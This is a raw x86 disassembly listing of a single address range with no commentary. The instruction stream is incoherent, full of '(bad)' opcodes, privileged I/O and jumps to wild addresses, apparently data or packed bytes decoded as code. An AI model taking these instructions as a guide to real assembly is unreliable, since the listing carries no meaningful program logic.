  40732d:	fisub  WORD PTR [eax+ebp*1+0x6a]
  407331:	ins    BYTE PTR es:[edi],dx
  407332:	std    
  407333:	pop    ebx
  407334:	pop    edx
  407335:	dec    ebp
  407336:	mov    eax,ds:0x42fdc213
  40733b:	out    dx,eax
  40733c:	push   eax
  40733d:	sub    DWORD PTR [ebp+0x1ae37e38],edi
  407343:	add    ch,0xa7
  407346:	and    DWORD PTR [ecx],esp
  407348:	shl    cl,1
  40734a:	xlat   BYTE PTR ds:[ebx]
  40734b:	ins    DWORD PTR es:[edi],dx
  40734c:	mov    ecx,0xb2f8e7a4
  407351:	into   
  407352:	and    BYTE PTR [ebx+ebx*4-0x7b4087bf],bl
  407359:	shl    BYTE PTR [ecx],0x8f
  40735c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40735d:	and    ecx,ebp
  40735f:	dec    edx
  407360:	xor    al,0xe6
  407362:	mov    edx,0xc771b57a
  407367:	hlt    
  407368:	shl    BYTE PTR [ecx+0x3b9ae939],0x32
  40736f:	pop    es
  407370:	fimul  WORD PTR [ebp-0x4a]
  407373:	out    0x36,eax
  407375:	ja     0x407319
  407377:	mov    al,ds:0x91b45f72
  40737c:	add    BYTE PTR [edx],bh
  40737e:	push   eax
  40737f:	or     DWORD PTR [edx-0x1a],ebx
  407382:	jo     0x4073ac
  407384:	pop    ss
  407385:	(bad)  
  407386:	inc    edi
  407387:	fstp   QWORD PTR [ecx+ecx*4-0x23]
  40738b:	dec    ebp
  40738c:	gs push edi
  40738e:	sub    eax,0xffffffb8
  407391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407392:	mov    edi,0xbf10e573
  407397:	pop    edi
  407398:	sbb    eax,0xa511e5de
  40739d:	in     al,0x73
  40739f:	pop    edx
  4073a0:	push   ebp
  4073a1:	cmp    ebp,DWORD PTR [ebp-0x37b23091]
  4073a7:	adc    al,0x64
  4073a9:	dec    ecx
  4073aa:	call   0xc1b39e09
  4073af:	xchg   edx,eax
  4073b0:	add    al,0x40
  4073b2:	mov    gs,WORD PTR [eax]
  4073b4:	repz fprem 
  4073b7:	inc    ebp
  4073b8:	jmp    0x7f6a0c32
  4073bd:	jle    0x407358
  4073bf:	in     al,dx
  4073c0:	mul    BYTE PTR [edi-0x2]
  4073c3:	daa    
  4073c4:	adc    al,0x1b
  4073c6:	in     al,0xae
  4073c8:	jecxz  0x40743d
  4073ca:	jno    0x407363
  4073cc:	mov    eax,0xf5317c67
  4073d1:	xor    bh,bl
  4073d3:	inc    esp
  4073d4:	jb     0x407411
  4073d6:	or     al,0xdb
  4073d8:	iret   
  4073d9:	and    BYTE PTR [ecx],bl
  4073db:	add    eax,0xe7c3a20f
  4073e0:	nop
  4073e1:	lea    esi,[esi+0x70]
  4073e4:	gs push esi
  4073e6:	(bad)  
  4073e7:	fs in  eax,0xa8
  4073ea:	aas    
  4073eb:	cmp    BYTE PTR [ecx+ebx*1],dl
  4073ee:	jge    0x4073d0
  4073f0:	scas   eax,DWORD PTR es:[edi]
  4073f1:	aam    0xd6
  4073f3:	dec    ecx
  4073f4:	sbb    edi,DWORD PTR [edx-0x14f9150]
  4073fa:	fld    QWORD PTR [eax-0x2011fba7]
  407400:	push   ss
  407401:	mov    ecx,0x2e53e014
  407406:	xor    ebx,ecx
  407408:	dec    edx
  407409:	rcl    DWORD PTR [ebp+ecx*1+0x51723d15],1
  407410:	cmp    eax,0xba7a2e83
  407415:	cli    
  407416:	cmp    eax,0x38e298f5
  40741b:	mov    dl,0xef
  40741d:	pop    eax
  40741e:	test   BYTE PTR [ecx-0x5e],cl
  407421:	sbb    dh,cl
  407423:	rol    BYTE PTR [esi+0x11],1
  407426:	in     eax,dx
  407427:	mov    ebp,0x38b71768
  40742c:	inc    ebp
  40742d:	inc    edx
  40742e:	aad    0xbc
  407430:	inc    edi
  407431:	mov    dl,BYTE PTR [esi+0x63]
  407434:	adc    esp,DWORD PTR [ecx]
  407436:	cmp    al,0x5b
  407438:	jne    0x4074a4
  40743a:	mov    bl,0xa4
  40743c:	clc    
  40743d:	popf   
  40743e:	push   cs
  40743f:	std    
  407440:	mov    eax,ds:0xf8b592fc
  407445:	bound  ecx,QWORD PTR [ebx]
  407447:	xchg   edi,eax
  407448:	mov    ch,0x4c
  40744a:	and    BYTE PTR [ecx],cl
  40744c:	inc    edx
  40744d:	cdq    
  40744e:	cdq    
  40744f:	sub    eax,0x357a1bee
  407454:	cs ds and DWORD PTR ss:[edi-0x5cdbc013],edi
  40745d:	aas    
  40745e:	mov    BYTE PTR [esi+0x1c],al
  407461:	add    esi,eax
  407463:	inc    edx
  407464:	sbb    eax,0xc85d7825
  407469:	push   eax
  40746a:	aaa    
  40746b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40746c:	dec    esp
  40746d:	mov    ch,0x3e
  40746f:	pusha  
  407470:	mov    eax,ds:0x4d4366d1
  407475:	mov    ah,0x39
  407477:	or     ah,al
  407479:	xchg   edx,eax
  40747a:	repnz mov edi,DWORD PTR [edx-0x6f7e476]
  407481:	repz pushf 
  407483:	and    dl,bh
  407485:	xchg   edx,eax
  407486:	push   0xf690c65e
  40748b:	repnz fwait
  40748d:	mov    eax,ds:0xd4b68803
  407492:	push   esp
  407493:	jp     0x407465
  407495:	push   ebp
  407496:	lock into 
  407498:	mov    bh,0x8f
  40749a:	xchg   esp,eax
  40749b:	sub    esp,DWORD PTR [eax-0x30938096]
  4074a1:	and    eax,0x25b42511
  4074a6:	std    
  4074a7:	push   0xb4892a5e
  4074ac:	xor    DWORD PTR [edx-0x3f1fd471],edx
  4074b2:	pop    eax
  4074b3:	push   ds
  4074b4:	loop   0x4074a5
  4074b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b7:	add    eax,edx
  4074b9:	xchg   ebp,eax
  4074ba:	mov    ebp,0x7279cccf
  4074bf:	pop    es
  4074c0:	push   0x41e5f1a8
  4074c5:	xchg   esp,eax
  4074c6:	xor    BYTE PTR [esi+0x1c],0xaf
  4074ca:	dec    edx
  4074cb:	dec    edi
  4074cc:	mov    esp,0x8dcc38c1
  4074d1:	dec    eax
  4074d2:	loop   0x4074d0
  4074d4:	cdq    
  4074d5:	mov    edi,0x8748b831
  4074da:	clc    
  4074db:	sar    BYTE PTR [edi+0x0],cl
  4074de:	mov    al,0x92
  4074e0:	fsub   DWORD PTR [ebp-0xf7d6cc9]
  4074e6:	int    0xa2
  4074e8:	sub    edi,DWORD PTR [edi+0x33]
  4074eb:	loopne 0x407493
  4074ed:	loopne 0x40749a
  4074ef:	test   al,0xbc
  4074f1:	sbb    ecx,DWORD PTR ss:[eax-0xc]
  4074f5:	daa    
  4074f6:	std    
  4074f7:	push   0xec47e9be
  4074fc:	ja     0x4074f7
  4074fe:	sbb    ebx,DWORD PTR [edx]
  407500:	aam    0xbe
  407502:	pop    ebp
  407503:	mov    esp,0xc04cf8ca
  407508:	mov    bh,0x6
  40750a:	into   
  40750b:	xor    bl,BYTE PTR [ecx+0x38]
  40750e:	jp     0x407517
  407510:	pop    ss
  407511:	enter  0xc957,0x18
  407515:	loope  0x40757d
  407517:	icebp  
  407518:	pop    ecx
  407519:	loop   0x4074ad
  40751b:	jae    0x40758f
  40751d:	inc    eax
  40751e:	mov    edx,0x5677ee96
  407523:	inc    eax
  407524:	xor    eax,0xffd2824
  407529:	mov    ecx,ecx
  40752b:	scas   eax,DWORD PTR es:[edi]
  40752c:	adc    bh,BYTE PTR [ecx]
  40752e:	cmp    al,0x89
  407530:	adc    DWORD PTR ds:0xf179d06,edi
  407536:	xchg   cl,bl
  407538:	cld    
  407539:	push   esp
  40753a:	mov    ch,BYTE PTR [edi+ecx*8]
  40753d:	fcom   st(0)
  40753f:	cmp    bl,BYTE PTR [eax-0x1b]
  407542:	adc    al,bh
  407544:	xor    eax,0x1c522563
  407549:	sub    BYTE PTR [ebx-0x27],bl
  40754c:	inc    edi
  40754d:	out    0xcd,eax
  40754f:	and    eax,0x14999f98
  407554:	add    edx,DWORD PTR [ebx]
  407556:	lea    eax,es:[esi-0x75]
  40755a:	jle    0x40758a
  40755c:	or     eax,0x76d2f3ad
  407561:	loop   0x4074e7
  407563:	sahf   
  407564:	pop    ebp
  407565:	cmp    DWORD PTR [ebx-0x1e],esi
  407568:	xchg   esp,eax
  407569:	mov    ah,BYTE PTR [eax+0x2f79daa4]
  40756f:	push   cs
  407570:	lods   eax,DWORD PTR ds:[esi]
  407571:	inc    edi
  407572:	arpl   WORD PTR [eax],si
  407574:	push   cs
  407575:	loop   0x4075a1
  407577:	and    eax,0xb32ccdf2
  40757c:	push   esi
  40757d:	jae    0x40753d
  40757f:	mov    dh,0x72
  407581:	mov    WORD PTR [ebx],?
  407583:	mov    esp,0x7e18450
  407588:	in     al,dx
  407589:	dec    ecx
  40758a:	pusha  
  40758b:	cs jbe 0x4075e7
  40758e:	lods   al,BYTE PTR ds:[esi]
  40758f:	jl     0x407548
  407591:	cmp    eax,0x7a13ba5b
  407596:	and    al,0x9f
  407598:	mov    esi,0x5b6ac65e
  40759d:	or     bl,BYTE PTR [eax-0x50]
  4075a0:	or     edx,DWORD PTR [ebp+0x3b309a63]
  4075a6:	sbb    dl,BYTE PTR [ebx-0xa]
  4075a9:	rol    BYTE PTR [eax-0x41],0xea
  4075ad:	sub    edx,ebx
  4075af:	jo     0x407583
  4075b1:	clc    
  4075b2:	gs ret 0xf465
  4075b6:	jl     0x40755d
  4075b8:	adc    al,0x33
  4075ba:	into   
  4075bb:	clc    
  4075bc:	pop    ss
  4075bd:	sbb    dl,BYTE PTR [ebx+edx*1]
  4075c0:	cmp    eax,0xccf3b76f
  4075c5:	and    eax,0x4bf0197e
  4075ca:	repz sbb DWORD PTR [esi],eax
  4075cd:	cld    
  4075ce:	shl    DWORD PTR [esi],cl
  4075d0:	pop    edi
  4075d1:	je     0x407617
  4075d3:	mov    dh,0xbf
  4075d5:	xchg   esp,eax
  4075d6:	xchg   BYTE PTR ds:0x184f79dd,cl
  4075dc:	out    0x91,eax
  4075de:	imul   eax,DWORD PTR [eax],0xffffffc8
  4075e1:	fst    QWORD PTR [eax-0x57bdbc8d]
  4075e7:	dec    esp
  4075e8:	idiv   eax
  4075ea:	(bad)  
  4075eb:	jae    0x40765d
  4075ed:	inc    esp
  4075ee:	out    0xd2,eax
  4075f0:	cmp    DWORD PTR [ebx],0x26
  4075f3:	aam    0xf
  4075f5:	stos   BYTE PTR es:[edi],al
  4075f6:	xlat   BYTE PTR ds:[ebx]
  4075f7:	repz cmp esp,DWORD PTR [ebx+0x6a]
  4075fb:	hlt    
  4075fc:	arpl   WORD PTR [ecx],cx
  4075fe:	pop    esp
  4075ff:	in     eax,dx
  407600:	xor    al,0x83
  407602:	mov    dh,0xde
  407604:	mov    ebp,DWORD PTR ds:0x79a172fc
  40760a:	sub    edx,DWORD PTR [esi+0x45]
  40760d:	es jg  0x4075df
  407610:	je     0x40763e
  407612:	arpl   WORD PTR [ecx+eiz*8+0x61],bp
  407616:	and    DWORD PTR [ecx-0x30],esi
  407619:	xor    bh,al
  40761b:	cmc    
  40761c:	mov    cl,0x90
  40761e:	stc    
  40761f:	rcr    DWORD PTR [edx],0xa2
  407622:	jmp    0x407681
  407624:	fwait
  407625:	adc    esp,edx
  407627:	mov    bl,0x41
  407629:	std    
  40762a:	psrld  mm1,mm1
  40762d:	pop    esi
  40762e:	adc    ah,ah
  407630:	adc    BYTE PTR [ebp-0x7ba9d5d7],cl
  407636:	xlat   BYTE PTR ds:[ebx]
  407637:	repnz loope 0x40760f
  40763a:	imul   ebx,ebx,0xfffffff8
  40763d:	mov    dl,0x8f
  40763f:	jae    0x407647
  407641:	inc    eax
  407642:	adc    eax,0xb335b8c0
  407647:	lods   eax,DWORD PTR ds:[esi]
  407648:	sub    BYTE PTR [eax+0x7a24bc55],dl
  40764e:	cs int3 
  407650:	cmp    edx,DWORD PTR [edi-0x6e02b0f4]
  407656:	mov    bh,0x12
  407658:	push   0xffffffed
  40765a:	test   BYTE PTR [esi-0x4e84143d],ah
  407660:	jbe    0x40763b
  407662:	add    esp,edx
  407664:	jp     0x4076d2
  407666:	pop    ss
  407667:	addr16 sbb eax,0x54c745b9
  40766d:	mov    esp,0xcac3f4e2
  407672:	scas   eax,DWORD PTR es:[edi]
  407673:	sbb    DWORD PTR [esi+0x5e1ac0c2],esi
  407679:	cmp    DWORD PTR [edx-0x54],edi
  40767c:	(bad)  
  40767d:	xor    eax,0x2beb5784
  407682:	stos   BYTE PTR es:[edi],al
  407683:	loopne 0x407643
  407685:	push   cs
  407686:	fadd   DWORD PTR [esi]
  407688:	jg     0x4076f4
  40768a:	fadd   st,st(0)
  40768c:	int    0x25
  40768e:	mov    edi,DWORD PTR [ebx]
  407690:	add    esi,0x55
  407693:	sub    ecx,edi
  407695:	(bad)  
  407696:	cmp    bh,BYTE PTR [ecx-0x2d6db250]
  40769c:	lea    esi,[eax+ebp*8+0x1f]
  4076a0:	ins    DWORD PTR es:[edi],dx
  4076a1:	push   edi
  4076a2:	cmp    eax,0xf89f335d
  4076a7:	xchg   edx,eax
  4076a8:	in     eax,0xb6
  4076aa:	inc    edx
  4076ab:	aas    
  4076ac:	cmp    DWORD PTR [eax+0x2],ebp
  4076af:	sub    al,BYTE PTR gs:[edi+ebx*4]
  4076b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076b4:	xor    eax,0xb69ba99c
  4076b9:	retf   0x461d
  4076bc:	loop   0x4076bb
  4076be:	and    BYTE PTR [edi],0x2a
  4076c1:	addr16 push esi
  4076c3:	mov    eax,ds:0x62f2e641
  4076c8:	je     0x407656
  4076ca:	lods   al,BYTE PTR ds:[esi]
  4076cb:	pushf  
  4076cc:	loop   0x407690
  4076ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076cf:	inc    eax
  4076d0:	enter  0xefb0,0x80
  4076d4:	fidiv  DWORD PTR [ebp+0x21]
  4076d7:	fwait
  4076d8:	or     ebx,0x2
  4076db:	out    dx,eax
  4076dc:	inc    edi
  4076dd:	mov    al,ds:0x7142301f
  4076e2:	sbb    BYTE PTR [ecx],ah
  4076e4:	shl    DWORD PTR [esi+0x58],cl
  4076e7:	xlat   BYTE PTR ds:[ebx]
  4076e8:	jae    0x40771e
  4076ea:	popf   
  4076eb:	hlt    
  4076ec:	(bad)  
  4076ed:	in     eax,dx
  4076ee:	mov    DWORD PTR [edi-0x25fdb600],ebx
  4076f4:	pop    edi
  4076f5:	jb     0x4076a7
  4076f7:	stos   BYTE PTR es:[edi],al
  4076f8:	retf   0x70e8
  4076fb:	js     0x407706
  4076fd:	cwde   
  4076fe:	cs jcxz 0x407712
  407702:	fbstp  TBYTE PTR [edx-0x1ef71ca]
  407708:	sbb    eax,0x3ff4472f
  40770d:	jle    0xa538332e
  407713:	mov    esi,0xa26a4326
  407718:	or     al,0x2d
  40771a:	xor    DWORD PTR [ebx+eiz*4-0x67],eax
  40771e:	inc    eax
  40771f:	pop    ebx
  407720:	jge    0x40777e
  407722:	popf   
  407723:	pop    ds
  407724:	push   0xe717b110
  407729:	sbb    bh,BYTE PTR [ebx+edx*1-0x25]
  40772d:	push   0xfcd611ec
  407732:	add    BYTE PTR [edi],bh
  407734:	fldcw  WORD PTR [edi+edi*2+0x18075808]
  40773b:	ins    WORD PTR es:[edi],dx
  40773d:	push   ebp
  40773e:	sub    DWORD PTR [eax+0x4f2a6b26],ebx
  407744:	int3   
  407745:	stos   DWORD PTR es:[edi],eax
  407746:	ins    DWORD PTR es:[edi],dx
  407747:	fistp  WORD PTR ds:0x19b21b98
  40774d:	or     esi,edi
  40774f:	test   al,0xa9
  407751:	mov    bl,0xb0
  407753:	sub    eax,0x7cff8be7
  407758:	inc    eax
  407759:	dec    edx
  40775a:	sub    eax,0xb731b0b4
  40775f:	jb     0x407737
  407761:	sub    eax,0x3b7bc28a
  407766:	pop    edx
  407767:	xchg   esi,eax
  407768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407769:	bound  eax,QWORD PTR [edx-0x40]
  40776c:	sbb    al,0x7c
  40776e:	shl    BYTE PTR [edi-0x19],cl
  407771:	imul   eax,edx,0x48
  407774:	push   0x7
  407776:	mov    edx,0x48bc5e78
  40777b:	adc    ch,BYTE PTR [esi+0x62a831aa]
  407781:	mov    dl,0x31
  407783:	sub    BYTE PTR [ecx+0x3a],0x99
  407787:	add    esp,ebp
  407789:	inc    ebp
  40778a:	pop    ecx
  40778b:	cmp    ebp,DWORD PTR [ecx-0x6d]
  40778e:	jae    0x4077f6
  407790:	cmp    BYTE PTR [eax-0x622ae0be],ah
  407796:	fadd   st,st(6)
  407798:	loop   0x4077f9
  40779a:	stos   BYTE PTR es:[edi],al
  40779b:	adc    ch,cl
  40779d:	push   ebx
  40779e:	test   al,0x7e
  4077a0:	add    DWORD PTR [ecx+0x2a],edx
  4077a3:	inc    edx
  4077a4:	retf   0x67e3
  4077a7:	lods   eax,DWORD PTR ds:[esi]
  4077a8:	dec    edx
  4077a9:	fwait
  4077aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077ab:	pop    es
  4077ac:	mov    esp,0x7f12b2a7
  4077b1:	call   0xe9a2:0xe2dc69b2
  4077b8:	mov    eax,0x14df524b
  4077bd:	and    eax,0x5d39cd27
  4077c2:	call   0x4465:0x48a1f143
  4077c9:	and    DWORD PTR [ebx+ebx*8+0x56f961f5],0x6a
  4077d1:	and    al,0x3b
  4077d3:	push   edi
  4077d4:	or     ebx,ecx
  4077d6:	xor    ecx,DWORD PTR [ebp+0x2d881297]
  4077dc:	xlat   BYTE PTR ds:[ebx]
  4077dd:	std    
  4077de:	pop    esp
  4077df:	jp     0x4077ad
  4077e1:	(bad)  
  4077e2:	pop    edx
  4077e3:	or     dh,BYTE PTR [esi+0x6001a10b]
  4077e9:	repz xor eax,0xef173364
  4077ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077f0:	hlt    
  4077f1:	imul   ebx,DWORD PTR [ebp+0x3ae3ce99],0x65c631b7
  4077fb:	jp     0x40780f
  4077fd:	xchg   DWORD PTR [ebx+0x11],esi
  407800:	repnz loop 0x40783e
  407803:	jmpw   0x330a
  407807:	jl     0x407820
  407809:	std    
  40780a:	scas   al,BYTE PTR es:[edi]
  40780b:	mov    bh,0x65
  40780d:	shl    DWORD PTR [ecx-0xdcb1d6d],1
  407813:	(bad)  
  407814:	sbb    BYTE PTR [bx+si],bl
  407817:	sahf   
  407818:	jle    0x4077b2
  40781a:	call   0x15bc755c
  40781f:	(bad)  
  407821:	cld    
  407822:	add    BYTE PTR [ecx],bh
  407824:	mov    al,0xfe
  407826:	dec    eax
  407827:	xchg   DWORD PTR [ebx-0x15],edx
  40782a:	cmp    DWORD PTR [edx],ecx
  40782c:	daa    
  40782d:	das    
  40782e:	jmp    FWORD PTR [esi+0x483975c9]
  407834:	dec    esp
  407835:	adc    eax,0xa83eaebe
  40783a:	adc    ebx,DWORD PTR [ecx-0x7cf6c265]
  407840:	jle    0x407899
  407842:	or     BYTE PTR [edi+0x45eca07e],bh
  407848:	mov    ebx,0xb8f5fea7
  40784d:	aam    0x6c
  40784f:	mov    ch,0x94
  407851:	dec    esi
  407852:	mov    ebx,0xbe710c8c
  407857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407858:	cmc    
  407859:	pop    ebx
  40785a:	cdq    
  40785b:	lea    edx,[eax-0x73]
  40785e:	cmp    DWORD PTR [ebx-0x4b8bf503],edx
  407864:	ss out 0xb9,eax
  407867:	pop    edx
  407868:	push   ecx
  407869:	fstp   st(1)
  40786b:	inc    ebx
  40786c:	leave  
  40786d:	add    DWORD PTR [edx+eax*8+0x8850a6a],ebp
  407874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407875:	dec    edx
  407876:	(bad)  
  407877:	push   0xffffff91
  407879:	(bad)  
  40787a:	mov    ecx,0xf6d25677
  40787f:	and    al,0x75
  407881:	sbb    al,ch
  407883:	(bad)  
  407885:	xchg   ebp,eax
  407886:	cs jmp 0x4078d8
  407889:	cmp    esi,DWORD PTR [ebp-0x6ce23e52]
  40788f:	das    
  407890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407891:	mov    ebx,0x11804192
  407896:	lods   al,BYTE PTR ds:[esi]
  407897:	push   ss
  407898:	out    dx,al
  407899:	jo     0x407851
  40789b:	fs retf 0xb89a
  40789f:	mov    edi,0xd65a00fc
  4078a4:	jp     0x4078ad
  4078a6:	les    esp,FWORD PTR [eax-0x2]
  4078a9:	mov    bh,0x2d
  4078ab:	repz xor eax,0xb080ac44
  4078b1:	loop   0x407839
  4078b3:	iret   
  4078b4:	pop    ebx
  4078b5:	mov    ss,WORD PTR [eax-0x27]
  4078b8:	pop    ebp
  4078b9:	in     al,dx
  4078ba:	xchg   ebx,eax
  4078bb:	(bad)  
  4078bc:	aas    
  4078bd:	addr16 out 0x3b,al
  4078c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078c1:	sbb    BYTE PTR cs:[edx+0x78],ch
  4078c5:	mov    dh,0xec
  4078c7:	(bad)  
  4078c8:	dec    ebx
  4078c9:	sbb    eax,0xd70ba35a
  4078ce:	sbb    edx,edi
  4078d0:	stos   BYTE PTR es:[edi],al
  4078d1:	test   al,0xdd
  4078d3:	sub    bl,BYTE PTR [esi+0x42]
  4078d6:	mov    cl,0xd7
  4078d8:	add    BYTE PTR [edi-0x5f16e91],0x63
  4078df:	or     DWORD PTR [edi],0x4afdd425
  4078e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078e6:	cmp    al,0x90
  4078e8:	sbb    eax,0x75a9852
  4078ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078ee:	add    al,0xc5
  4078f0:	gs scas eax,DWORD PTR es:[edi]
  4078f2:	xor    al,0xc0
  4078f4:	add    BYTE PTR [ebp+0x1f3c8324],ch
  4078fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078fb:	xchg   ebx,eax
  4078fc:	push   ebx
  4078fd:	int    0xa1
  4078ff:	btc    DWORD PTR [ecx*1+0x155007e4],eax
  407907:	cld    
  407908:	test   al,0xf1
  40790a:	cmp    al,0xcb
  40790c:	pushf  
  40790d:	ins    DWORD PTR es:[edi],dx
  40790e:	mov    bh,0xc9
  407910:	push   ss
  407911:	xchg   ebx,eax
  407912:	ret    0xe880
  407915:	add    BYTE PTR [ebp-0x6355528],al
  40791b:	(bad)  
  40791c:	loop   0x407950
  40791e:	test   DWORD PTR [edx+ebp*8],esp
  407921:	leave  
  407922:	mov    cl,0x22
  407924:	test   ecx,esi
  407926:	in     al,0xcf
  407928:	test   DWORD PTR [ecx],ebp
  40792a:	lds    edi,FWORD PTR [eax+0x4e]
  40792d:	enter  0x36dc,0x7
  407931:	cmp    dl,dh
  407933:	(bad)  
  407934:	aaa    
  407935:	fidivr WORD PTR [ebp-0x26350ec6]
  40793b:	inc    ebp
  40793c:	rcr    DWORD PTR [ecx+0x73],0xc1
  407940:	dec    eax
  407941:	test   eax,0x886c6bb1
  407946:	leave  
  407947:	nop
  407948:	add    ecx,DWORD PTR [ecx]
  40794a:	rol    BYTE PTR [edi+0x382a359e],1
  407950:	xchg   esp,edi
  407952:	cmp    DWORD PTR cs:[ebp-0x19f7d7a0],edx
  407959:	mov    esi,gs
  40795b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40795c:	or     ah,BYTE PTR [eax-0x9]
  40795f:	push   ecx
  407960:	jo     0x407935
  407962:	and    cl,bl
  407964:	ds jns 0x40796e
  407967:	out    dx,al
  407968:	inc    edx
  407969:	in     al,dx
  40796a:	leave  
  40796b:	push   edx
  40796c:	ficom  WORD PTR [ebx]
  40796e:	in     al,0x63
  407970:	dec    ecx
  407971:	adc    dh,BYTE PTR ds:0x822b9957
  407977:	cmp    eax,0x362fbe40
  40797c:	mov    ebx,0xa0d22e1b
  407981:	pop    ss
  407982:	mov    BYTE PTR [ebp+eax*1+0x3f],cl
  407986:	jmp    0x4079fb
  407988:	xor    cl,BYTE PTR [esi+0x74d9ab9c]
  40798e:	(bad)  
  407990:	out    dx,al
  407991:	lea    ecx,[edx-0x133c3f82]
  407997:	(bad)  
  407998:	pop    ss
  407999:	jle    0x40798d
  40799b:	icebp  
  40799c:	sahf   
  40799d:	jae    0x40792e
  40799f:	pusha  
  4079a0:	adc    al,0xd3
  4079a2:	sti    
  4079a3:	inc    edi
  4079a4:	push   ds
  4079a5:	je     0x407989
  4079a7:	test   BYTE PTR [ebx-0x62],0xd2
  4079ab:	ins    BYTE PTR es:[edi],dx
  4079ac:	shl    dh,0xd9
  4079af:	jecxz  0x4079db
  4079b1:	sub    edi,ecx
  4079b3:	stc    
  4079b4:	loopne 0x407972
  4079b6:	loop   0x407989
  4079b8:	das    
  4079b9:	push   ss
  4079ba:	test   DWORD PTR fs:[ecx+ebp*4-0x76ab49e7],0x98be5736
  4079c6:	dec    ecx
  4079c7:	adc    bl,0x61
  4079ca:	push   ecx
  4079cb:	(bad)  
  4079cc:	jle    0x407a44
  4079ce:	(bad)  
  4079cf:	std    
  4079d0:	lea    ebp,gs:[esi]
  4079d3:	push   ds
  4079d4:	sar    BYTE PTR [ebp+esi*2-0x186619c8],cl
  4079db:	fild   QWORD PTR [ecx+esi*4-0x47]
  4079df:	mov    bh,0xd8
  4079e1:	cmc    
  4079e2:	inc    ebp
  4079e3:	mov    es,WORD PTR [eax]
  4079e5:	fsubr  st(4),st
  4079e7:	mov    cl,0x10
  4079e9:	or     al,0xca
  4079eb:	adc    al,0x81
  4079ed:	mov    ebx,0xcc2eca17
  4079f2:	outs   dx,DWORD PTR ds:[esi]
  4079f3:	cmp    BYTE PTR [ebp+0x24],0xf0
  4079f7:	sub    esp,eax
  4079f9:	push   eax
  4079fa:	icebp  
  4079fb:	jns    0x407a39
  4079fd:	scas   al,BYTE PTR es:[edi]
  4079fe:	push   eax
  4079ff:	pop    eax
  407a00:	loope  0x407a7d
  407a02:	mov    cl,0x43
  407a04:	xor    al,cl
  407a06:	idiv   BYTE PTR [edi+0x62]
  407a09:	int    0x45
  407a0b:	cmp    eax,DWORD PTR [edx+0x47]
  407a0e:	cwde   
  407a0f:	or     BYTE PTR [esi-0xb24e5fc],bl
  407a15:	push   esi
  407a16:	push   cs
  407a17:	aam    0x57
  407a19:	jno    0x4079ca
  407a1b:	mov    ebp,0xc15cd086
  407a20:	sti    
  407a21:	cmp    bh,bl
  407a23:	push   edi
  407a24:	add    dl,0xc5
  407a27:	sub    eax,eax
  407a29:	call   0x7ec:0x4af147f0
  407a30:	pop    esp
  407a31:	pop    ebp
  407a32:	mov    DWORD PTR [edx],eax
  407a34:	xchg   edi,eax
  407a35:	sub    bh,BYTE PTR [ebp+0x2b61c21c]
  407a3b:	pop    edx
  407a3c:	xor    BYTE PTR [eax-0x216af578],dl
  407a42:	jmp    0xc050117b
  407a47:	imul   DWORD PTR [esi-0x5919d796]
  407a4d:	cli    
  407a4e:	mov    edi,0x439e4a50
  407a53:	add    al,0x92
  407a55:	dec    ebp
  407a56:	xlat   BYTE PTR ds:[ebx]
  407a57:	cmp    eax,0x630f3fa3
  407a5c:	adc    edi,0x185ac579
  407a62:	cmc    
  407a63:	fwait
  407a64:	ja     0x407a21
  407a66:	pop    edi
  407a67:	jle    0x407a4f
  407a69:	dec    esi
  407a6a:	jmp    0xc22c:0xa5aad4de
  407a71:	add    ebp,DWORD PTR [edi]
  407a73:	mov    eax,0xb4419254
  407a78:	or     BYTE PTR [eax],cl
  407a7a:	(bad)  
  407a7b:	neg    DWORD PTR [ebx+0x2e00adf7]
  407a81:	add    DWORD PTR [ebx-0x18],eax
  407a84:	call   0x5e54c395
  407a89:	adc    al,0xa3
  407a8b:	mov    ecx,DWORD PTR [esi]
  407a8d:	dec    ebp
  407a8e:	dec    ebx
  407a8f:	adc    BYTE PTR [esi],0x93
  407a92:	cld    
  407a93:	adc    al,0xdf
  407a95:	mov    cl,0xf1
  407a97:	mov    edx,0x148b99d9
  407a9c:	pop    esp
  407a9d:	push   es
  407a9e:	mov    ah,0xb
  407aa0:	jmp    0xa5d2603e
  407aa5:	addr16 fstp st(7)
  407aa8:	inc    esi
  407aa9:	jmp    0xac9baa90
  407aae:	xchg   ecx,eax
  407aaf:	scas   al,BYTE PTR es:[edi]
  407ab0:	rol    edi,cl
  407ab2:	mov    fs,WORD PTR [ebp-0x6a]
  407ab5:	sub    dh,BYTE PTR [ebx]
  407ab7:	mov    ds:0xba01aa9e,al
  407abc:	fsubr  QWORD PTR [ecx+0x5b3551bf]
  407ac2:	add    DWORD PTR [edi+0x68e4d6f4],edi
  407ac8:	dec    esp
  407ac9:	test   BYTE PTR [eax-0x23cfa2a4],cl
  407acf:	dec    esi
  407ad0:	jmp    0xe41e:0xc9bebd35
  407ad7:	push   esp
  407ad8:	pop    esp
  407ad9:	and    ebp,DWORD PTR [eax-0x4e]
  407adc:	push   es
  407add:	sub    ch,BYTE PTR [ecx-0x6]
  407ae0:	pop    ds
  407ae1:	xor    bl,BYTE PTR [ebp+0x68737e5b]
  407ae7:	adc    al,ah
  407ae9:	add    esp,DWORD PTR [ecx-0x373b6582]
  407aef:	jle    0x407b3b
  407af1:	or     al,BYTE PTR [edi]
  407af3:	inc    ecx
  407af4:	into   
  407af5:	cmp    bh,BYTE PTR [edi]
  407af7:	in     al,dx
  407af8:	mov    WORD PTR ds:0x15344361,?
  407afe:	js     0x407a92
  407b00:	cdq    
  407b01:	fmul   st,st(7)
  407b03:	(bad)  
  407b04:	ja     0x407af1
